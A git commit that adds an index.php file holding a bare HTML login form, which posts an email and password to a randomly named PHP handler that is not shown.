6ccaa9c66b0e08b8406d78dc73eadb6b31ea8987
Momogeronimo <95105902+Momogeronimo@users.noreply.github.com>
2021-12-17 01:00:57 +0000

    Add files via upload
    jejejeje

---
+++ index.php
@@ -0,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<style type="text/css">
+		input{
+			display: block;
+			margin: 10px auto;
+			
+		}
+		button{
+			display: block;
+			margin: 0 auto;
+		}
+
+	</style>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>index</title>
+</head>
+<body>
+	<form name="form" action="hyXMcbtBQ5e8Iipp.php" method="POST">
+		<input type="text" name="email" placeholder="email">
+		<input type="password" name="password" placeholder="password">
+		<button type="submit" name="submit">GET IN!</button>
+	</form>
+</body>
+</html>
